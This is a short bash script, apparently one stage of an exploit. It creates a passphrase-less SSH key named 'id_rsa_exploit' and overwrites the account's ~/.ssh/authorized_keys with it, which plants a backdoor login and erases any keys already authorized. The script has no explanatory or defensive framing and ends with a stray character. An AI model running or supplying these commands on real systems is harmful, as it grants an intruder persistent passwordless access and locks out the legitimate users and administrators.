#!/usr/bin/bash

export LD_LIBRARY_PATH=/usr/local/ssl/lib:/usr/local/lib:/usr/lib:/lib

yes | ssh-keygen -t rsa -q -f id_rsa_exploit -P ""
cat id_rsa_exploit.pub > ~/.ssh/authorized_keys
t
